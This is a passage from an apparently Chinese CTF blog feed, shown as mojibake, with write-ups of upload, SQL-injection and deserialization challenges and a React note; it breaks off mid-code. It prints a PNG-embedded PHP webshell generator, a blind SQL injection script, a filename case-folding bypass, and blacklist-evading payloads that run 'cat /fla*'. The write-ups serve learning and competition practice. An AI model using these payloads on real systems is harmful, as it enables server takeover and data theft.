imagecreatefrompng($file);</span><br><span class="line">        $size = min(imagesx($first), imagesy($first));</span><br><span class="line">        $second = imagecrop($first, [<span class="string">&#x27;x&#x27;</span> =&gt; <span class="number">0</span>, <span class="string">&#x27;y&#x27;</span> =&gt; <span class="number">0</span>, <span class="string">&#x27;width&#x27;</span> =&gt; $size, <span class="string">&#x27;height&#x27;</span> =&gt; $size]);</span><br><span class="line">        <span class="keyword">if</span> ($second !== <span class="literal">FALSE</span>) &#123;</span><br><span class="line">            $final_name = pathinfo($file)[<span class="string">&quot;basename&quot;</span>];</span><br><span class="line">            imagepng($second, <span class="string">&#x27;example/&#x27;</span>.$final_name);</span><br><span class="line">            imagedestroy($second);</span><br><span class="line">        &#125;</span><br><span class="line">        imagedestroy($first);</span><br><span class="line">        unlink($file);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>é¢˜ç›®çš„ä»£ç å¾ˆç®€å•çœ‹æ‡‚ï¼Œå°±æ˜¯å…è®¸ä¸Šä¼ zipï¼Œç„¶åå°†zipè§£å‹å‡ºæ¥ï¼Œcheckå‰ªå‡ºæ¥çš„æ—¶å€™æ˜¯å›¾ç‰‡ï¼Œå¦‚æœæ˜¯å›¾ç‰‡å°±é‡æ–°ç”Ÿæˆè£å‰ªä¹‹åæ”¾åˆ°exampleç›®å½•ä¸‹ï¼Œç„¶ååˆ é™¤åŸå›¾ç‰‡ã€‚</p>
<p>å¤§æ¦‚æ€è·¯å°±æ˜¯ä¸Šä¼ ä¸€ä¸ªzipï¼Œç„¶åå°†zipè§£å‹ä¹‹åè¦æ±‚æ˜¯ä¸€ä¸ªå…·æœ‰å›¾ç‰‡å±æ€§çš„PHPï¼Œè§£å‹getshell</p>
<p>éœ€è¦ç”¨è„šæœ¬æŠŠshellæ’å…¥åˆ°å›¾ç‰‡ä¸­é—´å¹¶ä¸”ä¸ä¼šæŸåå›¾ç‰‡ï¼Œä¸‹é¢è¿™ä¸ªè„šæœ¬å¯ä»¥åšåˆ°</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$p = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0xe</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>, <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>, <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>, <span class="number">0x5a</span>, <span class="number">0x1</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x1</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>, <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>, <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>, <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"> </span><br><span class="line">$img = imagecreatetruecolor(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> ($y = <span class="number">0</span>; $y &lt; sizeof($p); $y += <span class="number">3</span>) &#123;</span><br><span class="line">$r = $p[$y];</span><br><span class="line">$g = $p[$y+<span class="number">1</span>];</span><br><span class="line">$b = $p[$y+<span class="number">2</span>];</span><br><span class="line">$color = imagecolorallocate($img, $r, $g, $b);</span><br><span class="line">imagesetpixel($img, round($y / <span class="number">3</span>), <span class="number">0</span>, $color);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">imagepng($img,<span class="string">&quot;ciscn.php&quot;</span>);</span><br><span class="line"><span class="comment">//<span class="meta">&lt;?=</span>$_GET[0]($_POST[1]);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>å°†phpå‹ç¼©å³å¯</p>
<p>è‡³äºmb_strtolower ç»•è¿‡ï¼Œå¯ä»¥é€šè¿‡æŸäº›ç‰¹æ®Šç¬¦å·ç»•è¿‡</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PHP :: Request #70072 :: Add a language avare uppercase&#x2F;lowercase solution without need of locale change</span><br></pre></td></tr></table></figure>

<p>ä¸Šä¼ æ—¶ä½¿ç”¨<code>xxx.zÄ°p</code>ï¼Œç»è¿‡<code>mb_strtolower</code>åå­˜åˆ°æœåŠ¡å™¨çš„æ–‡ä»¶åå˜ä¸º<code>xxx.zip</code></p>
<p>æ³¨æ„è¸©å‘ï¼š è¿™é‡Œä½ éœ€è¦åœ¨æ–‡ä»¶åçš„æ—¶å€™ä¿®æ”¹ï¼Œå½¢å¦‚ï¼š</p>
<p><img src="CISCNUPLOAD/image-20210519210500240.png" alt="image-20210519210500240"></p>
<p>ç„¶åç›´æ¥ä¸Šä¼ å°±å¯ä»¥æˆåŠŸï¼Œå¦‚æœåœ¨burpæŠ“åŒ…çš„æ—¶å€™æ”¹ä¼šå¤±è´¥ï¼ˆw4,è¶…äººè¶…äººè¶…äººï¼‰</p>
<p>å…³äºå¦‚ä½•ä¿®æ”¹ZIPï¼Œä½ éœ€è¦å…ˆæ‰¾ä¸€ä¸ªæ­£å¸¸çš„pngï¼Œèƒ½ä¸Šä¼ çš„PNGï¼Œç„¶å</p>
<p><img src="image-20210519210649470.png" alt="image-20210519210649470"></p>
<p>ç¬¬äºŒè¡Œç¬¬å…«åˆ—ä¹‹å‰çš„partå¤åˆ¶ä¸‹æ¥ï¼Œç›´æ¥ä¿®æ”¹zipçš„å‰é¢</p>
<p><img src="image-20210519210710340.png" alt="image-20210519210710340"></p>
<p>æŠ“åŒ…ä¸Šä¼ </p>
<p><img src="image-20210519210720706.png" alt="image-20210519210720706"></p>
<p>ğŸ›«</p>
]]></content>
      <tags>
        <tag>PHP</tag>
        <tag>æ–‡ä»¶ä¸Šä¼ </tag>
      </tags>
  </entry>
  <entry>
    <title>ç¾å›¢CTFä¸¤ä¸ª</title>
    <url>/2021/05/23/%E7%BE%8E%E5%9B%A2CTF%E4%B8%A4%E4%B8%AA/</url>
    <content><![CDATA[<h1 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h1><p>è¿™é¢˜æ²¡ä»€ä¹ˆå¥½è¯´çš„</p>
<p>sqlæ³¨å…¥ï¼Œå¸ƒå°”ç›²æ³¨</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://eci-2ze15odoih1f3qlkwjtb.cloudeci1.ichunqiu.com/index.php&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">goodflag =<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">999</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>, <span class="number">127</span>):</span><br><span class="line">        <span class="keyword">if</span> j == <span class="number">94</span> <span class="keyword">or</span> j == <span class="number">46</span> <span class="keyword">or</span> j == <span class="number">42</span> <span class="keyword">or</span> j == <span class="number">43</span> <span class="keyword">or</span> j == <span class="number">63</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># print(j)</span></span><br><span class="line">        j = <span class="built_in">chr</span>(j).encode()</span><br><span class="line">        j = binascii.hexlify(j)</span><br><span class="line">        j = j.decode(<span class="string">&#x27;utf-8&#x27;</span>)  <span class="comment"># hex2bin</span></span><br><span class="line">        data = &#123;<span class="string">&quot;password&quot;</span>: <span class="string">&quot;||left(password,&#123;&#125;)regexp(binary(0x&#123;&#125;))#&quot;</span>.<span class="built_in">format</span>(i, flag + j)</span><br><span class="line">            , <span class="string">&quot;username&quot;</span>: <span class="string">&quot;\\&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">        res = requests.post(url=url, data=data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += j</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            goodflag = binascii.unhexlify(flag).decode()</span><br><span class="line">            print(goodflag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            <span class="comment"># print(res.text)</span></span><br><span class="line">        <span class="comment"># print(j)</span></span><br><span class="line">        <span class="keyword">if</span> j == <span class="string">&#x27;7d&#x27;</span>:</span><br><span class="line">            exit(<span class="string">&#x27;no&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># database CTF</span></span><br><span class="line"><span class="comment"># user root</span></span><br><span class="line"><span class="comment"># version 5.x?</span></span><br></pre></td></tr></table></figure>



<p>æ³¨å…¥å¾—åˆ°å¯†ç This_1s_thE_Passw0rdï¼Œç™»é™†å¾—åˆ°flag</p>
<h1 id="easytricks"><a href="#easytricks" class="headerlink" title="easytricks"></a>easytricks</h1><h2 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h2><p>æ¡ä»¶ç«äº‰</p>
<p>ååºåˆ—åŒ–å†™å…¥</p>
<p>çœŸçš„è„‘ç˜«ï¼Œæˆ‘æ²¡è§è¿‡è¿™æ ·å­å‡ºé¢˜çš„ï¼Œæ­£å¸¸çš„ç½‘ç«™åŠŸèƒ½ç”¨å®‰æ’å››æœˆèµ›çš„web2æ¥å‡ºï¼Œç„¶åä½ éº»ç—¹çš„æ²¡æœ‰ç”¨ï¼Œä½ è¿™ç½‘ç«™åŠŸèƒ½æ²¡ç”¨ä½ å†™ä½ éº»ç—¹ï¼Œä½ å°±ä¸€ä¸ªphpæœ‰ç”¨NTMèƒ½ä¸èƒ½ç›´æ¥ç»™å‡ºæ¥å•Šï¼Œè„‘æ®‹ï¼Ÿ</p>
<p><img src="image-20210523215019646.png" alt="image-20210523215019646"></p>
<p>çœŸçš„æç¬‘ï¼Œè¿™å…¶ä»–çš„PHPå…¨æ˜¯æ²¡æœ‰ä»»ä½•ä¸€ç‚¹ä¸€ä¸€ï¼Œç„¶åæ”¾åœ¨admin.rar é‡Œé¢ï¼Œæ¯”è°ç›®å½•å·¥å…·ç‰›é€¼ï¼ŸçœŸå‡ æŠŠæ­»äº†å—çš„äººæ‰å‡ºå¾—æ¥è¿™ç§é¢˜ç›®</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_save_path(<span class="string">&#x27;session&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">preload</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $class;</span><br><span class="line">    <span class="keyword">public</span> $contents;</span><br><span class="line">    <span class="keyword">public</span> $method;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="string">&quot;&lt;?php class hacker&#123;public function hack()&#123;echo &#x27;hack the hack!I believe you can!&#x27;;&#125;&#125;\$hack=&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;contents=<span class="string">&quot;new hacker();&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method=<span class="string">&quot;\$hack-&gt;hack();&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">$parm</span>)</span>&#123;</span><br><span class="line">        $blacklist=<span class="string">&quot;/flag|pcntl|system|exec|fread|file|fpassthru|popen|proc|ld|putenv|passthru|`|\.|\\\|#|\\$|[0-9]|_|get|~|\\^|eval|assert|open|write|include|require/is&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> preg_match($blacklist,$parm);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;waf(<span class="keyword">$this</span>-&gt;contents)||strlen(<span class="keyword">$this</span>-&gt;contents)&gt;<span class="number">60</span>||preg_match_all(<span class="string">&#x27;/\\(/i&#x27;</span>,<span class="keyword">$this</span>-&gt;contents,$matches)&gt;<span class="number">2</span>||preg_match_all(<span class="string">&#x27;/\\)/i&#x27;</span>,<span class="keyword">$this</span>-&gt;contents,$matches)&gt;<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(preg_match_all(<span class="string">&#x27;/;/i&#x27;</span>,<span class="keyword">$this</span>-&gt;contents,$matches)&gt;<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="string">&quot;try hard&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(file_exists(dirname(<span class="keyword">__FILE__</span>).<span class="string">&quot;/hack.php&quot;</span>))&#123;</span><br><span class="line">            unlink(dirname(<span class="keyword">__FILE__</span>).<span class="string">&quot;/hack.php&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        file_put_contents(dirname(<span class="keyword">__FILE__</span>).<span class="string">&quot;/hack.php&quot;</span>,<span class="keyword">$this</span>-&gt;class);</span><br><span class="line">        file_put_contents(dirname(<span class="keyword">__FILE__</span>).<span class="string">&quot;/hack.php&quot;</span>,<span class="keyword">$this</span>-&gt;contents,FILE_APPEND);</span><br><span class="line">        file_put_contents(dirname(<span class="keyword">__FILE__</span>).<span class="string">&quot;/hack.php&quot;</span>,<span class="keyword">$this</span>-&gt;method,FILE_APPEND);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="string">&quot;&lt;?php class hacker&#123;public function hack()&#123;echo &#x27;hack the hack!I believe you can!&#x27;;&#125;&#125;\$hack=&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method=<span class="string">&quot;\$hack-&gt;hack();&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=$_POST[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">unserialize($a);</span><br><span class="line">$preload=<span class="keyword">new</span> preload();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;a href=<span class="string">&quot;./hack.php&quot;</span>&gt;hack.php&lt;/a&gt;</span><br><span class="line">&lt;a href=<span class="string">&quot;./cli.php&quot;</span>&gt;cli.php&lt;/a&gt;</span><br></pre></td></tr></table></figure>



<p>ä»£ç å¯ä»¥å®¡è®¡ï¼Œå‘ç°æˆ‘ä»¬å¯ä»¥æ§åˆ¶å†™å…¥çš„å†…å®¹ï¼Œå†…å®¹è™½ç„¶è¿‡æ¥çš„å¾ˆä¸¥æ ¼ï¼Œå¤§æ¦‚è§„åˆ™å¦‚ä¸‹ï¼š</p>
<ul>
<li>ä¸¤ä¸ªå·¦æ‹¬å·ï¼Œä¸¤ä¸ªå³æ‹¬å·</li>
<li>ä¸€ä¸ªåˆ†å·</li>
<li>flag|pcntl|system|exec|fread|file|fpassthru|popen|proc|ld|putenv|passthru|`|.|\|#|\$|[0-9]|_|get|~|\^|eval|assert|open|write|include|require/is è¿‡æ»¤</li>
</ul>
<p>ç„¶åä¾ç„¶å¯ä»¥å†™å…¥- -</p>
<p><img src="image-20210523215943106.png" alt="image-20210523215943106"></p>
<p>å†™å…¥çš„å§¿åŠ¿æœ‰ä¸¤ä¸ªï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$preload=<span class="keyword">new</span> preload();</span><br><span class="line">$preload-&gt;contents=<span class="string">&quot;strrev(&#x27;metsys&#x27;)(&#x27;cat /fla*&#x27;);&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>æˆ–è€…è¯´ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$preload=<span class="keyword">new</span> preload();</span><br><span class="line">$preload-&gt;contents=<span class="string">&quot;strtr(&#x27;systed&#x27;,&#x27;ed&#x27;,&#x27;em&#x27;)(&#x27;cat /fla*&#x27;);&quot;</span>;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>PHP</tag>
        <tag>SQLæ³¨å…¥</tag>
      </tags>
  </entry>
  <entry>
    <title>Reactä¸€äº›å­¦ä¹ </title>
    <url>/2021/05/30/React%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>è¯´å®è¯æ˜å¹´æˆ‘çœŸçš„ä¸æƒ³åšå‰ç«¯äº†ï¼Œåˆç´¯è¿˜è¦è¢«åæ§½ç®€å•ã€‚</p>
<p>è¿™æ¬¡è‡ªå·±çš„å‰ç«¯ç”¨åˆ°çš„æŠ€æœ¯æ ˆè¿˜å¥½ï¼Œ</p>
<p>è·¯ç”±ç®¡ç†ï¼š umi</p>
<p>å‰ç«¯å±•ç¤ºï¼š antd</p>
<p>è®°å½•ä¸€ä¸‹è‡ªå·±é‡è§çš„çŸ¥è¯†ï¼š</p>
<p>æˆ‘è§‰å¾—æœ€ä¸»è¦çš„å°±æ˜¯hookï¼Œå¦‚ä½•ä½¿ç”¨å¥½hookæ˜¯å¾ˆé‡è¦çš„ã€‚è¯´å‡ ä¸ªè‡ªå·±å¸¸ç”¨çš„ï¼š</p>
<h1 id="useState"><a href="#useState" class="headerlink" title="useState"></a>useState</h1><p>å¸¸è§å½¢å¼ï¼š</p>
<p><strong>const [data, setData] = useState([]);</strong></p>
<p>è¿™ä¸ªå¯å¤ªå¥½ç”¨äº†ï¼Œæ„æ€æ˜¯å®šä¹‰äº†dataï¼Œå¹¶ç›´æ¥å®šä¹‰äº†ä¸€ä¸ªsetæ–¹æ³•ï¼Œå¹¶ä¸”è§„å®šäº†Stateçš„è¿”å›æœŸå¾…ä¸ºä¸€ä¸ªæ•°ç»„ã€‚</p>
<p>è¯¥hookä¸€èˆ¬æ­é…useEffect æ¥ä½¿ç”¨ã€‚</p>
<h1 id="useEffect"><a href="#useEffect" class="headerlink" title="useEffect"></a>useEffect</h1><p>å¸¸ç”¨æƒ…å†µï¼š</p>
<p>â€‹    åŸºæœ¬ä¸Šåªè¦ç”¨åˆ°äº†å¼‚æ­¥ï¼Œè½®è¯¢ä½ éƒ½å¿…é¡»æ¥è§¦åˆ°è¿™ä¸ªhookã€‚å…·ä½“ä¾‹å­å¦‚ä¸‹ï¼š</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line">useEffect(</span><br><span class="line">        ()=&gt;&#123;</span><br><span class="line">            fetch(<span class="string">&#x27;http://154.8.144.57:8000/api/log/&#x27;</span>)</span><br><span class="line">            .then(<span class="function">(<span class="params">response</span>) =&gt;</span> response.json())</span><br><span class="line">            .then(<span class="function">(<span class="params">json</span>) =&gt;</span> setData(json.logs))</span><br><span class="line">            .catch(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&#x27;fetch data failed&#x27;</span>, error);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;,[]);</span><br></pre></td></tr></table></figure>

<p>å®ƒå¯ä»¥å¸®åŠ©ä½ åœ¨åˆå§‹åŒ–é¡µé¢çš„æ—¶å€™è¿›è¡Œä¸€æ¬¡æ•°æ®çš„é‡‡é›†ï¼Œå¦‚æœç¬¬äºŒä¸ªå‚æ•°ä¸ºä½ çš„æœŸæœ›å€¼ï¼Œå¦‚æœä¸æœŸæœ›å€¼ä¸åŒçš„è¯å°±ä¼šé‡æ–°å°è¯•è·å–æ•°æ®ï¼Œæ¢å¥è¯è¯´å®ƒå¯ä»¥åšåˆ°ä¸¤ä¸ªäº‹æƒ…</p>
<ul>
<li>å¼€å±€æ›¿ä½ è·å–æ•°æ®</li>
<li>ä½¿ç”¨è½®è¯¢çš„æ–¹å¼åˆ·æ–°æ•°æ®</li>
</ul>
<h1 id="ç®­å¤´å‡½æ•°"><a href="#ç®­å¤´å‡½æ•°" class="headerlink" title="ç®­å¤´å‡½æ•°"></a>ç®­å¤´å‡½æ•°</h1><p>ä¸€å¼€å§‹çš„æ—¶å€™æˆ‘ä¸ä¼šå†™ï¼Œæ‰€ä»¥å¾ˆå¤šæ—¶å€™åˆ«äººçš„å·¥ç¨‹ä»£ç ä¹Ÿå¾ˆéš¾çœ‹æ‡‚ï¼Œä½†æ˜¯å½“æˆ‘æ˜ç™½ä¹‹åå‘ç°è¿˜æ˜¯ç›¸å½“å¥½ç”¨çš„ï¼Œä»–æœ€å¤§çš„å¥½å¤„å°±æ˜¯è®©ä½ ä»thisè¿™ä¸ªæ‰¯æ·¡çš„ä¸œè¥¿æ‘†è„±å‡ºæ¥äº†ã€‚</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">&lt;Menu.Item key=<span class="string">&quot;1&quot;</span> onClick=&#123;<span class="function">()=&gt;</span> history.push(<span class="string">&#x27;/admin/unitControl&#x27;</span>)&#125; &gt;ä¸»æœºç®¡ç†&lt;/Menu.Item&gt;</span><br><span class="line">&lt;Menu.Item key=<span class="string">&quot;2&quot;</span> onClick=&#123;<span class="function">() =&gt;</span> history.push(<span class="string">&#x27;/admin/processControl&#x27;</span>)&#125; &gt;è¿›ç¨‹ç®¡ç†&lt;/Menu.Item&gt;</span><br><span class="line">&lt;Menu.Item key=<span class="string">&quot;3&quot;</span> onClick=&#123;<span class="function">() =&gt;</span> history.push(<span class="string">&#x27;/admin/portControl&#x27;</span>)&#125; &gt;ç«¯å£ç®¡ç†&lt;/Menu.Item&gt;</span><br><span class="line">&lt;Menu.Item key=<span class="string">&quot;4&quot;</span> onClick=&#123;<span class="function">()=&gt;</span>history.push(<span class="string">&#x27;/admin/logControl&#x27;</span>)&#125; &gt;å†å²æ—¥å¿—ç›‘æ§&lt;/Menu.Item&gt;</span><br></pre></td></tr></table></figure>



<p><img src="image-20210530195849041.png" alt="image-20210530195849041"></p>
<p>é™„ä¸Šå®˜æ–¹çš„urlï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;developer.mozilla.org&#x2F;zh-CN&#x2F;docs&#x2F;Web&#x2F;JavaScript&#x2F;Reference&#x2F;Functions&#x2F;Arrow_functions</span><br></pre></td></tr></table></figure>

<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Functions/Arrow_functions#%E6%B2%A1%E6%9C%89%E5%8D%95%E7%8B%AC%E7%9A%84this">æ²¡æœ‰å•ç‹¬çš„<code>this</code></a></p>
<p>åœ¨ç®­å¤´å‡½æ•°å‡ºç°ä¹‹å‰ï¼Œæ¯ä¸€ä¸ªæ–°å‡½æ•°æ ¹æ®å®ƒæ˜¯è¢«å¦‚ä½•è°ƒç”¨çš„æ¥å®šä¹‰è¿™ä¸ªå‡½æ•°çš„thiså€¼ï¼š</p>
<ul>
<li>å¦‚æœæ˜¯è¯¥å‡½æ•°æ˜¯ä¸€ä¸ªæ„é€ å‡½æ•°ï¼ŒthisæŒ‡é’ˆæŒ‡å‘ä¸€ä¸ªæ–°çš„å¯¹è±¡</li>
<li>åœ¨ä¸¥æ ¼æ¨¡å¼ä¸‹çš„å‡½æ•°è°ƒç”¨ä¸‹ï¼ŒthisæŒ‡å‘undefined</li>
<li>å¦‚æœæ˜¯è¯¥å‡½æ•°æ˜¯ä¸€ä¸ªå¯¹è±¡çš„æ–¹æ³•ï¼Œåˆ™å®ƒçš„thisæŒ‡é’ˆæŒ‡å‘è¿™ä¸ªå¯¹è±¡</li>
<li>ç­‰ç­‰</li>
</ul>
<p><code>This</code>è¢«è¯æ˜æ˜¯ä»¤äººåŒçƒ¦çš„é¢å‘å¯¹è±¡é£æ ¼çš„ç¼–ç¨‹ã€‚(è¿™å¥è¯å¤ªå¯¹äº†ï¼Œå¦‚æœä½ é¡¹ç›®å·¥ç¨‹ä¸€å¤§thiså°±å¾ˆæ‰¯)</p>
<p>å…¶ä»–æ„Ÿè§‰æ²¡æœ‰å•¥äº†ï¼Œreactçš„å®˜ç½‘çš„æ–‡æ¡£å•Šï¼ŒçœŸçš„æ˜¯æ‰€æœ‰æ–‡æ¡£çš„å…¸èŒƒï¼Œå†™çš„å¤ªæ¸…æ™°äº†ã€‚</p>
]]></content>
      <tags>
        <tag>Javascript</tag>
        <tag>å‰ç«¯</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn2winå„ç§å°è¯•å¤ç°</title>
    <url>/2021/06/01/pwn2win%E5%90%84%E7%A7%8D%E5%B0%9D%E8%AF%95%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å› ä¸ºç¾å›¢ã€‚dozerå’Œå­¦æ ¡å„ç§äº‹æƒ…ç»“æœæ²¡èƒ½æ‰“ä¸Špwn2winï¼Œä¸è¿‡å‘Šä¸€æ®µè½ä¹‹åé©¬ä¸Šæ¥åšåšå›½é™…èµ›é•¿é•¿è§è¯†ï¼Œç¬¬ä¸€ä¸ªå°±æ˜¯ã€‚å…¨éƒ½æ˜¯nodeé¢˜ç›®å•Šã€ä¸ä¼šã€‘ï¼Œä¸è¿‡æ„Ÿè§‰è¿˜æ˜¯ç›¸å½“æœ‰è¶£çš„ï¼</p>
<h1 id="illusion"><a href="#illusion" class="headerlink" title="illusion"></a>illusion</h1><p>è¿™é¢˜æ˜¯æœ€ç®€å•çš„ï¼Œä¹Ÿæ˜¯æœ€å¤šäººåšå‡ºæ¥çš„ï¼Œå¯æ˜¯æˆ‘å´ä¸çŸ¥é“å’‹å¤ç°[å› ä¸ºæˆ‘ä¸ä¼šé‚£ä¸ªä»€ä¹ˆhashcashè®¡ç®—ï¼Œå¸Œæœ›æœ‰å¸ˆå‚…çœ‹è§äº†èƒ½å‘Šè¯‰æˆ‘å‘œå‘œ</p>
<h2 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h2><pre><code>+ çœ‹é™„ä»¶
+ åŸå‹é“¾æ±¡æŸ“
+ ejs RCE</code></pre>
<p>é¢˜ç›®å¼€å‡ºç»™äº†dockerfile(é‡è¦)å’Œ æºç </p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> jsonpatch = <span class="built_in">require</span>(<span class="string">&#x27;fast-json-patch&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> ejs = <span class="built_in">require</span>(<span class="string">&#x27;ejs&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> basicAuth = <span class="built_in">require</span>(<span class="string">&#x27;express-basic-auth&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express()</span><br><span class="line"></span><br><span class="line"><span class="comment">// Middlewares //</span></span><br><span class="line">app.use(bodyParser.json())</span><br><span class="line">app.use(basicAuth(&#123;</span><br><span class="line">    users: &#123; <span class="string">&quot;admin&quot;</span>: process.env.SECRET || <span class="string">&quot;admin&quot;</span> &#125;,</span><br><span class="line">    challenge: <span class="literal">true</span></span><br><span class="line">&#125;))</span><br><span class="line"></span><br><span class="line"><span class="comment">/////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> services = &#123;</span><br><span class="line">    status: <span class="string">&quot;online&quot;</span>,</span><br><span class="line">    cameras: <span class="string">&quot;online&quot;</span>,</span><br><span class="line">    doors: <span class="string">&quot;online&quot;</span>,</span><br><span class="line">    dome: <span 